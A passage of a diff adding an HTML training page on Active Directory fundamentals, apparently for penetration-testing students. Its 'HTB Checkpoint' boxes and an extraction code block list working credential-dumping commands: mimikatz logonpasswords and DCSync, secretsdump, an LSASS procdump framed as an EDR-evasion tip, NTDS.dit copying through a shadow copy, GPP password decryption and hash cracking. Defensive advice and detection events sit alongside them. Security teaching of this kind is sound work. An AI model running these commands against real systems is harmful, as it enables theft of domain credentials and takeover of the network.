+        <text x="355" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 4</text>
+        <text x="461" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 5</text>
+        <text x="565" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 6</text>
+        <text x="667" y="200" text-anchor="middle" font-family="system-ui,sans-serif" font-size="9" fill="#94A3B8">Step 7</text>
+
+        <!-- Description bar -->
+        <rect x="10" y="230" width="720" height="74" rx="10" fill="#F8FAFC" stroke="#E2E8F0"/>
+        <text x="380" y="252" text-anchor="middle" font-family="system-ui,sans-serif" font-size="11" fill="#334155" font-weight="700">What Happens at Each Step</text>
+        <text x="20" y="270" font-family="system-ui,sans-serif" font-size="9" fill="#475569">① You type username + password → ② Winlogon captures it (Ctrl+Alt+Del SAS) → ③ LSASS receives credentials, creates NT hash</text>
+        <text x="20" y="285" font-family="system-ui,sans-serif" font-size="9" fill="#475569">④ Kerberos AS-REQ sent to DC with encrypted timestamp → ⑤ DC checks NTDS.dit, verifies, issues TGT → ⑥ Access Token created with SIDs + group memberships</text>
+        <text x="20" y="300" font-family="system-ui,sans-serif" font-size="9" fill="#475569">⑦ Windows Explorer starts, user profile loads, GPOs applied → Desktop appears. Total time: typically under 1 second.</text>
+      </svg>
+      <div class="diagram-label">Windows Domain Login — Internal Step-by-Step Process</div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-red">⚠️</div>
+      <div><div class="block-title">LSASS — The Gatekeeper (and Attacker Target)</div></div>
+    </div>
+    <div class="callout callout-red">
+      <span class="callout-icon">💉</span>
+      <div class="callout-body">
+        <h4>Why LSASS is the #1 Attack Target</h4>
+        <ul>
+          <li>LSASS stores <strong>NT hashes, Kerberos tickets, and cleartext credentials in memory</strong></li>
+          <li><strong>Mimikatz</strong> (<code>sekurlsa::logonpasswords</code>) dumps everything from LSASS memory</li>
+          <li>Windows Defender Credential Guard moves credentials into an isolated VM-based container — prevents LSASS dumps</li>
+          <li>Windows 11+ enables <strong>LSASS Protection</strong> (PPL) by default — requires kernel driver to bypass</li>
+          <li>Detection: Event ID <code>4656</code> / <code>10</code> (Sysmon) — handle on lsass.exe from unexpected process</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="htb-card">
+      <div class="htb-header">
+        <span class="htb-badge">🚩 HTB Checkpoint</span>
+        <span class="htb-title">Credential Dumping Techniques</span>
+      </div>
+      <p class="htb-body">After gaining admin access on a domain-joined machine:</p>
+      <div class="htb-tips">
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>mimikatz # sekurlsa::logonpasswords</code> — Dump LSASS credentials from memory</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>mimikatz # lsadump::dcsync /user:Administrator</code> — DCSync to get DA hash without touching disk</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>impacket-secretsdump DOMAIN/admin@DC01</code> — Remote NTDS.dit dump</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><strong>OPSEC tip:</strong> Use <code>procdump -ma lsass.exe</code> then offline mimikatz to reduce EDR detection</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 6 — LOCAL VS DOMAIN USER
+════════════════════════════════════════ -->
+<section id="local-vs-dom" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 06</div>
+    <div class="section-tag tag-green">👤 User Accounts</div>
+    <h2 class="section-title">Local User vs Domain User</h2>
+    <p class="section-subtitle">Understanding the difference between a user that lives on one machine versus one that can roam the entire enterprise.</p>
+  </div>
+
+  <div class="content-block">
+    <div class="card">
+      <table class="compare-table">
+        <thead>
+          <tr><th>Aspect</th><th>👤 Local User</th><th>🌐 Domain User</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Where stored</td><td>SAM database (<code>C:\Windows\System32\config\SAM</code>)</td><td>AD database (NTDS.dit on DC)</td></tr>
+          <tr><td>Login scope</td><td>Only on that one computer</td><td>Any domain-joined machine</td></tr>
+          <tr><td>Authentication</td><td>Local SAM check — no DC needed</td><td>DC required (Kerberos/NTLM)</td></tr>
+          <tr><td>Password policy</td><td>Local policy only</td><td>Domain password policy (GPO)</td></tr>
+          <tr><td>Group membership</td><td>Local groups only</td><td>Domain groups + local groups</td></tr>
+          <tr><td>Centrally managed</td><td class="cross-cell">❌ No</td><td class="check-cell">✅ Yes (via AD)</td></tr>
+          <tr><td>GPO applied</td><td class="cross-cell">❌ No</td><td class="check-cell">✅ Yes</td></tr>
+          <tr><td>Attack relevance</td><td>Local priv esc, SAM dump</td><td>Lateral movement, DCSync</td></tr>
+          <tr><td>Example</td><td>.\Administrator (RID 500)</td><td>CORP\alice (Domain user)</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="grid-2">
+      <div class="callout callout-amber">
+        <span class="callout-icon">⚠️</span>
+        <div class="callout-body">
+          <h4>Common Mistake: Same Local Admin Password</h4>
+          <p>If all machines in the domain share the <strong>same local Administrator password</strong> (common in old environments), an attacker who dumps one SAM can use that hash to access <strong>every machine</strong>. Solution: <strong>LAPS (Local Administrator Password Solution)</strong> — rotates and randomizes local admin passwords per machine.</p>
+        </div>
+      </div>
+      <div class="callout callout-blue">
+        <span class="callout-icon">💡</span>
+        <div class="callout-body">
+          <h4>The Built-in Administrator (RID 500)</h4>
+          <p>Every Windows machine has a local Administrator account with RID 500. This account <strong>cannot be locked out</strong>. Even if renamed, tools identify it by its SID ending in -500. Always disable it or set a strong, unique password. It's often the target of local credential attacks.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="interview-set">
+      <div class="interview-card">
+        <div class="interview-q"><div class="interview-q-num">Q1</div><div class="interview-q-text">Can a domain user log in if the DC is unavailable?</div></div>
+        <div class="interview-a">Yes — if the user has <strong>previously logged into that machine</strong>, Windows caches their credentials locally (up to 10 cached logons by default, controlled by the <em>Interactive logon: Number of previous logons to cache</em> policy). The cached verifier (DCC2 hash) allows offline login. Attackers target these cached hashes with tools like <code>cachedump</code>.</div>
+      </div>
+      <div class="interview-card">
+        <div class="interview-q"><div class="interview-q-num">Q2</div><div class="interview-q-text">What is LAPS and why is it important?</div></div>
+        <div class="interview-a"><strong>Local Administrator Password Solution (LAPS)</strong> automatically sets a unique, random password for the local Administrator account on each domain-joined machine and stores it in AD (readable only by authorized admins). This prevents lateral movement via shared local admin credentials — one of the most common attack paths in enterprise environments.</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 7 — GROUP POLICY
+════════════════════════════════════════ -->
+<section id="gpo" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 07</div>
+    <div class="section-tag tag-amber">📋 Policy Control</div>
+    <h2 class="section-title">Group Policy Objects (GPO)</h2>
+    <p class="section-subtitle">The mechanism by which administrators enforce security settings, software configurations, and restrictions across every user and computer in the domain — from one central location.</p>
+  </div>
+
+  <div class="content-block">
+    <div class="card card-blue">
+      <p class="definition-text">
+        A <strong>Group Policy Object (GPO)</strong> is a collection of settings that administrators apply to <em>users</em> or <em>computers</em> in an AD domain. GPOs are linked to <strong>Sites, Domains, or OUs</strong> and are processed when a computer starts up or a user logs in. They can enforce anything from <strong>password complexity</strong> to <strong>blocking USB drives</strong> to <strong>deploying software</strong>.
+      </p>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-indigo">⚙️</div>
+      <div><div class="block-title">GPO Processing Order — LSDOU</div><div class="block-subtitle">Later policies override earlier ones (with exceptions)</div></div>
+    </div>
+    <div class="step-flow">
+      <div class="step-item">
+        <div class="step-line"></div>
+        <div class="step-num" style="background:linear-gradient(135deg,#0EA5E9,#2563EB)">L</div>
+        <div class="step-content">
+          <h4>Local GPO</h4>
+          <p>Applied first. Settings configured directly on the local computer. Lowest precedence — overridden by everything else.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-line"></div>
+        <div class="step-num" style="background:linear-gradient(135deg,#2563EB,#4F46E5)">S</div>
+        <div class="step-content">
+          <h4>Site GPO</h4>
+          <p>Applied second. Linked to AD Sites (physical network locations). Rarely used — mainly for network-topology-based settings.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-line"></div>
+        <div class="step-num" style="background:linear-gradient(135deg,#4F46E5,#7C3AED)">D</div>
+        <div class="step-content">
+          <h4>Domain GPO</h4>
+          <p>Applied third. Linked to the domain itself. Good for universal settings like password policy and account lockout.</p>
+        </div>
+      </div>
+      <div class="step-item">
+        <div class="step-num" style="background:linear-gradient(135deg,#7C3AED,#9333EA)">OU</div>
+        <div class="step-content">
+          <h4>OU GPO (innermost wins)</h4>
+          <p>Applied last — highest precedence. Nested OU GPOs: parent OU first, then child OU. Most specific setting wins. Admins use OU GPOs for department-specific policies.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="block-header">
+      <div class="block-icon icon-amber">🔐</div>
+      <div><div class="block-title">Security Settings You Can Enforce via GPO</div></div>
+    </div>
+    <div class="accordion">
+      <div class="accordion-item">
+        <button class="accordion-trigger"><span>🔒</span> Password Policy<svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg></button>
+        <div class="accordion-panel"><div class="accordion-body">Minimum password length (recommend 12+), complexity requirements (upper/lower/number/symbol), password history (remember 24), max password age (90 days), account lockout threshold (5 attempts). Applied at Domain level only for domain accounts. Fine-Grained Password Policies (FGPP) allow different policies per group.</div></div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger"><span>🖥️</span> Desktop & Software Restrictions<svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg></button>
+        <div class="accordion-panel"><div class="accordion-body">Block access to Control Panel, disable USB/removable storage, restrict which applications can run (AppLocker / Software Restriction Policies), force screensaver with password, deploy software packages via MSI, map network drives and printers. Every user setting can be locked down centrally.</div></div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger"><span>🌐</span> Network & Security Settings<svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg></button>
+        <div class="accordion-panel"><div class="accordion-body">Windows Firewall rules, disable NTLM, enforce SMB signing, configure Windows Defender settings, enable audit policies (logon events, object access, privilege use), configure Credential Guard, enable Protected Process Light for LSASS. GPO is your primary security hardening tool.</div></div>
+      </div>
+      <div class="accordion-item">
+        <button class="accordion-trigger"><span>📜</span> Scripts & Logon Actions<svg class="accordion-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg></button>
+        <div class="accordion-panel"><div class="accordion-body">Run PowerShell/batch scripts at startup, shutdown, logon, or logoff. These scripts live in <code>\\DC\SYSVOL\</code> — a critical location attackers check for hardcoded credentials. Also used for legitimate tasks: map drives, set printer defaults, clear temp files. Always check SYSVOL during a pentest.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="htb-card">
+      <div class="htb-header">
+        <span class="htb-badge">🚩 HTB Checkpoint</span>
+        <span class="htb-title">GPO Abuse — Privilege Escalation</span>
+      </div>
+      <p class="htb-body">If you have <strong>write permissions on a GPO</strong> that applies to an OU containing admin accounts or DCs, you can abuse it:</p>
+      <div class="htb-tips">
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>Get-GPO -All</code> then BloodHound to find GPO write permissions</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span>Use <strong>SharpGPOAbuse</strong> to add immediate task via GPO → execute as SYSTEM on targets</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span>Check <code>\\DC\SYSVOL\domain\Policies\</code> for GPP files with cpassword (CVE-2014-1812)</span></div>
+        <div class="htb-tip"><span class="htb-tip-icon">▶</span><span><code>Get-GPPPassword</code> from PowerSploit — decrypts AES-256 GPP passwords (MS published the key!)</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 8 — NTDS.dit
+════════════════════════════════════════ -->
+<section id="ntds" class="lesson-section">
+<div class="section-inner">
+
+  <div class="section-header">
+    <div class="section-num">Chapter 08</div>
+    <div class="section-tag tag-red">🗄️ Critical Asset</div>
+    <h2 class="section-title">NTDS.dit — The AD Database</h2>
+    <p class="section-subtitle">The most sensitive file in your entire Windows environment. Contains every user's password hash, every object, every secret. Here's what's inside and why it matters.</p>
+  </div>
+
+  <div class="content-block">
+    <div class="card" style="background:linear-gradient(135deg,#0F172A,#1E293B);border-color:#334155;">
+      <p class="definition-text" style="color:#E2E8F0;">
+        <strong style="color:#60A5FA;">NTDS.dit</strong> (NT Directory Services Database) is a <em style="color:#A5B4FC;font-style:normal;font-weight:600;">Microsoft JET Blue database</em> stored at <code style="background:#334155;color:#9FE870;padding:2px 6px;border-radius:4px;">C:\Windows\NTDS\NTDS.dit</code> on every Domain Controller. It contains <strong style="color:#FCD34D;">every object in Active Directory</strong> — users, computers, groups, password hashes, Kerberos keys, and more. This single file, if extracted, gives an attacker <strong style="color:#FCA5A5;">the keys to your entire kingdom</strong>.
+      </p>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="grid-2">
+      <div>
+        <div class="block-header"><div class="block-icon icon-red">📂</div><div><div class="block-title">What's Inside NTDS.dit</div></div></div>
+        <div class="callout callout-purple">
+          <span class="callout-icon">🗃️</span>
+          <div class="callout-body">
+            <h4>Database Tables</h4>
+            <ul>
+              <li><strong>datatable</strong> — All AD objects (users, computers, groups) and their attributes</li>
+              <li><strong>link_table</strong> — Relationships between objects (group memberships)</li>
+              <li><strong>sd_table</strong> — Security descriptors (ACLs, permissions)</li>
+              <li><strong>hidden_table</strong> — Metadata, schema info</li>
+            </ul>
+          </div>
+        </div>
+        <div style="margin-top:12px;" class="callout callout-red">
+          <span class="callout-icon">🔑</span>
+          <div class="callout-body">
+            <h4>Password Hashes Stored</h4>
+            <ul>
+              <li><strong>NT Hash</strong> (MD4 of password) — Used for NTLM auth</li>
+              <li><strong>LM Hash</strong> (legacy, disabled by default)</li>
+              <li><strong>Kerberos Keys</strong> (AES-256, AES-128, DES variants)</li>
+              <li><strong>WDigest</strong> (cleartext if enabled — old setting)</li>
+              <li><strong>NTDS.dit is encrypted</strong> with the SYSTEM key (Boot Key / SYSKEY)</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="block-header"><div class="block-icon icon-amber">💉</div><div><div class="block-title">Extraction Methods</div></div></div>
+        <div class="code-block" style="font-size:12px;">
+          <pre><span class="cm"># Method 1: Volume Shadow Copy (local)</span>
+<span class="kw">vssadmin</span> create shadow /for=C:
+<span class="kw">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+       Windows\NTDS\NTDS.dit C:\Temp\
+<span class="kw">reg save</span> HKLM\SYSTEM C:\Temp\SYSTEM
+
+<span class="cm"># Method 2: secretsdump (impacket)</span>
+<span class="kw">impacket-secretsdump</span> <span class="str">-ntds NTDS.dit</span> <span class="str">-system SYSTEM</span> LOCAL
+
+<span class="cm"># Method 3: DCSync (no file needed!)</span>
+<span class="kw">mimikatz</span> <span class="attr">#</span> <span class="str">lsadump::dcsync /domain:corp.local /all</span>
+
+<span class="cm"># Crack the hashes</span>
+<span class="kw">hashcat</span> <span class="attr">-m 1000</span> hashes.txt rockyou.txt</pre>
+        </div>
+        <div style="margin-top:12px;" class="callout callout-green">
+          <span class="callout-icon">🛡️</span>
+          <div class="callout-body">
+            <h4>Defending NTDS.dit</h4>
+            <ul>
+              <li>Restrict DC access to Tier 0 admins only</li>
+              <li>Monitor VSS creation events on DCs (Event 8222)</li>
+              <li>Block DCSync: restrict <em>DS-Replication-Get-Changes-All</em> permission</li>
+              <li>Enable Microsoft Defender for Identity — detects DCSync in real-time</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="content-block">
+    <div class="summary-card">
+      <div class="summary-title">✅ Module Summary — Key Takeaways</div>
+      <div class="summary-list">
+        <div class="summary-item"><div class="summary-check">✓</div><span>Active Directory is Microsoft's centralized identity and access management system used in 95%+ of enterprises</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>Structure: Forest → Domain → OU → Objects (Users, Computers, Groups, Service Accounts)</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>Domain Controller is the brain — runs Kerberos KDC, LDAP, DNS, SYSVOL, and hosts NTDS.dit</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>Kerberos v5 is the preferred auth protocol — ticket-based, mutual auth, no passwords on wire</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>NTLM is legacy but still used — vulnerable to Pass-the-Hash, relay attacks, and brute force</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>LSASS stores credentials in memory — primary target for credential dumping (Mimikatz)</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>NTDS.dit holds every password hash in the domain — most valuable file for attackers</span></div>
+        <div class="summary-item"><div class="summary-check">✓</div><span>GPOs enforce security settings centrally — also a target for privilege escalation if misconfigured</span></div>
+      </div>
+    </div>
+  </div>
+
+</div>
+</section>
+
+
+<!-- ═══════════════════════════════════════
+     SECTION 9 — QUIZ
+════════════════════════════════════════ -->
+<section id="quiz" class="quiz-section">
+<div class="section-inner">
+
+  <div class="section-header visible" style="text-align:center">
+    <div class="section-tag tag-purple" style="display:inline-flex">🧠 Knowledge Check</div>
+    <h2 class="section-title">Module 1 Quiz</h2>
+    <p class="section-subtitle">Test your understanding of Active Directory fundamentals. 8 questions covering everything from structure to attack techniques.</p>
+  </div>
+
+  <div class="quiz-card">
+    <div id="quiz-container"></div>
+  </div>
+
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════
+     SKILL RECAP
+════════════════════════════════════════ -->
+<section style="padding:56px 48px;background:var(--bg-card);border-bottom:1px solid var(--border);">
+<div class="section-inner">
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start;">
+    <div>
+      <div class="section-tag tag-indigo" style="display:inline-flex;margin-bottom:16px;">📈 Skill Progress</div>
+      <h3 style="font-size:22px;font-weight:800;color:var(--text);margin-bottom:8px;">What You've Learned</h3>
+      <p style="font-size:14px;color:var(--text-3);margin-bottom:24px;">Competency gained across this module.</p>
+      <div>
+        <div class="skill-meter-row"><span class="skill-label">AD Architecture</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:90%;background:linear-gradient(90deg,#2563EB,#4F46E5)"></div></div><span class="skill-pct-label">90%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">Domain Controller</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:85%;background:linear-gradient(90deg,#4F46E5,#7C3AED)"></div></div><span class="skill-pct-label">85%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">Kerberos Auth</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:80%;background:linear-gradient(90deg,#7C3AED,#9333EA)"></div></div><span class="skill-pct-label">80%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">NTLM &amp; Attacks</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:75%;background:linear-gradient(90deg,#DC2626,#F59E0B)"></div></div><span class="skill-pct-label">75%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">GPO &amp; Policy</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:80%;background:linear-gradient(90deg,#059669,#0EA5E9)"></div></div><span class="skill-pct-label">80%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">Attack Techniques</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:70%;background:linear-gradient(90deg,#DC2626,#9333EA)"></div></div><span class="skill-pct-label">70%</span></div>
+        <div class="skill-meter-row"><span class="skill-label">Defense Strategy</span><div class="skill-track"><div class="skill-fill" style="--skill-pct:72%;background:linear-gradient(90deg,#16A34A,#059669)"></div></div><span class="skill-pct-label">72%</span></div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:12px;">
+      <div class="callout callout-blue">
+        <span class="callout-icon">🎯</span>
+        <div class="callout-body">
+          <h4>Recommended Next Steps</h4>
+          <ul>
+            <li>Lab on <strong>HackTheBox Academy</strong> — AD Enumeration path</li>
+            <li>Build a local AD lab: Windows Server Eval + 2 Win10 VMs</li>
+            <li>Run BloodHound + SharpHound on your lab</li>
+            <li>HTB machine: <strong>Forest</strong> (AS-REP Roasting)</li>
+            <li>Book: <em>The Hacker Playbook 3</em> — AD chapters</li>
+          </ul>
+        </div>
+      </div>
+      <div class="callout callout-green">
+        <span class="callout-icon">🏆</span>
+        <div class="callout-body">
+          <h4>Aligned Certifications</h4>
+          <ul>
+            <li><strong>OSCP</strong> — AD is heavily tested in the exam</li>
+            <li><strong>CEH</strong> — Domain attack module</li>
+            <li><strong>CompTIA Security+</strong> — Identity management domain</li>
+            <li><strong>Microsoft SC-900</strong> — Entra ID / Azure AD</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════════
+     NEXT MODULE TEASER
+════════════════════════════════════════ -->
+<section style="padding:72px 48px;background:linear-gradient(160deg,#0F172A 0%,#1E1B4B 60%,#1E3A5F 100%);position:relative;overflow:hidden;">
+  <div style="position:absolute;width:500px;height:500px;top:-100px;right:-100px;background:radial-gradient(circle,rgba(99,102,241,.15) 0%,transparent 70%);pointer-events:none;"></div>
+  <div class="section-inner">
+    <div style="display:grid;grid-template-columns:1fr auto;gap:32px;align-items:center;">
+      <div>
+        <div style="font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#818CF8;margin-bottom:10px;">Coming Up Next</div>
+        <h2 style="font-size:28px;font-weight:800;color:#fff;letter-spacing:-.02em;margin-bottom:12px;">Module 2: LDAP &amp; AD Enumeration</h2>
+        <p style="font-size:15px;color:#94A3B8;line-height:1.65;max-width:480px;margin-bottom:24px;">Now that you understand the structure, learn how to <strong style="color:#E2E8F0;">query it</strong>. Dive into LDAP protocol internals, BloodHound graph analysis, PowerView enumeration, and building a full picture of any AD environment from a low-privileged account.</p>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;">
+          <span style="padding:4px 12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#CBD5E1;border-radius:999px;font-size:12px;">LDAP Protocol</span>
+          <span style="padding:4px 12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#CBD5E1;border-radius:999px;font-size:12px;">BloodHound &amp; Neo4j</span>
+          <span style="padding:4px 12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#CBD5E1;border-radius:999px;font-size:12px;">PowerView</span>
+          <span style="padding:4px 12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#CBD5E1;border-radius:999px;font-size:12px;">ACL Enumeration</span>
+          <span style="padding:4px 12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);color:#CBD5E1;border-radius:999px;font-size:12px;">Trust Analysis</span>
+        </div>
+        <button onclick="alert('Module 2 coming soon! Complete the quiz in Module 1 first. 🎯')" style="display:inline-flex;align-items:center;gap:8px;padding:13px 24px;background:linear-gradient(135deg,#4F46E5,#7C3AED);color:#fff;font-size:14px;font-weight:600;border-radius:12px;border:none;cursor:pointer;box-shadow:0 4px 16px rgba(99,102,241,.3);">
+          Start Module 2
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+        </button>
+      </div>
+      <div style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:24px;padding:32px;text-align:center;min-width:180px;">
+        <div style="font-size:52px;font-weight:900;color:#818CF8;opacity:.6;letter-spacing:-.04em;">02</div>
+        <div style="font-size:14px;font-weight:600;color:#94A3B8;margin-top:4px;">Next Module</div>
+        <div style="margin-top:16px;font-size:32px;">🔍</div>
+        <div style="font-size:11px;color:#475569;margin-top:8px;line-height:1.5;">LDAP &amp;<br>Enumeration</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer style="background:#0F172A;padding:28px 48px;border-top:1px solid #1E293B;">
+  <div class="section-inner" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;">
+    <div style="font-size:13px;font-weight:700;color:#334155;">
+      <span style="color:#60A5FA;">CyberAcademy</span> Pro — Module 1: Active Directory Fundamentals
+    </div>
+    <div style="font-size:11px;color:#334155;">
+      Keyboard: <code style="background:#1E293B;padding:2px 6px;border-radius:4px;color:#94A3B8;">↑↓</code> navigate &nbsp;·&nbsp;
+      <code style="background:#1E293B;padding:2px 6px;border-radius:4px;color:#94A3B8;">Esc</code> close menu
+    </div>
+    <div style="display:flex;gap:20px;">
+      <a href="#" style="font-size:12px;color:#475569;transition:color .2s;" onmouseover="this.style.color='#94A3B8'" onmouseout="this.style.color='#475569'">Resources</a>
+      <a href="#" style="font-size:12px;color:#475569;transition:color .2s;" onmouseover="this.style.color='#94A3B8'" onmouseout="this.style.color='#475569'">HTB Labs</a>
+      <a href="#" style="font-size:12px;color:#475569;transition:color .2s;" onmouseover="this.style.color='#94A3B8'" onmouseout="this.style.color='#475569'">Community</a>
+    </div>
+  </div>
+</footer>
+
+</main>
+</div>
+
+<!-- Back to Top -->
+<button class="back-top" id="back-top" title="Back to top" onclick="window.scrollTo({top:0,behavior:'smooth'})">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+    <line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/>
+  </svg>
+</button>
+
+<script src="script.js"></script>
+</body>
+</html>
